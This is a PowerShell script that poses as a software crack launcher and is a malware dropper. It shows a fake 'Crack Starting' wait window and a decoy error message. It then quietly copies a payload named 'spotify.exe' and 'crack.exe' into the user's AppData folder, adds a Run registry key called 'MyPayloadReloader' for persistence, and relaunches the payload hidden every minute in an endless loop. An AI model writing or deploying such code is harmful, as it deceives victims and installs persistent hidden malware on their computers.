Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName System.Windows.Forms

$waitWindow = New-Object System.Windows.Window
$waitWindow.Title = "Processing"
$waitWindow.Width = 300
$waitWindow.Height = 100
$waitWindow.WindowStartupLocation = "CenterScreen"
$waitWindow.ResizeMode = "NoResize"
$waitWindow.WindowStyle = "None"
$waitWindow.Topmost = $true

$label = New-Object System.Windows.Controls.Label
$label.Content = "please wait, Crack Starting ..."
$label.HorizontalAlignment = "Center"
$label.VerticalAlignment = "Center"
$label.FontSize = 14
$waitWindow.Content = $label

$timer = New-Object System.Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromSeconds(15)
$timer.Add_Tick({
    $timer.Stop()
    $waitWindow.Close()
})
$timer.Start()
$waitWindow.ShowDialog() | Out-Null

[System.Windows.Forms.MessageBox]::Show("An error occurred.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)


$payloadName = "spotify.exe"
$exeName = "crack.exe"

# Origine addres
if ($PSCommandPath) {
    $scriptPath = Split-Path -Parent $PSCommandPath
} else {
    Add-Type -AssemblyName System.Windows.Forms
    $scriptPath = [System.IO.Path]::GetDirectoryName([System.Windows.Forms.Application]::ExecutablePath)
}

$originalPayloadPath = Join-Path $scriptPath $payloadName
$originalExePath = Join-Path $scriptPath $exeName

$safePath = "$env:APPDATA\Microsoft\Windows"
$destinationPayload = Join-Path $safePath $payloadName
$destinationExe = Join-Path $safePath $exeName

if (!(Test-Path $destinationPayload)) {
    Copy-Item -Path $originalPayloadPath -Destination $destinationPayload -Force | Out-Null
}
if (!(Test-Path $destinationExe)) {
    Copy-Item -Path $originalExePath -Destination $destinationExe -Force | Out-Null
}


$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$keyName = "MyPayloadReloader"
New-ItemProperty -Path $regPath -Name $keyName -Value $destinationExe -PropertyType String -Force | Out-Null

while ($true) {
    Start-Process -WindowStyle Hidden -FilePath $destinationPayload
      Start-Sleep -Seconds 60
}
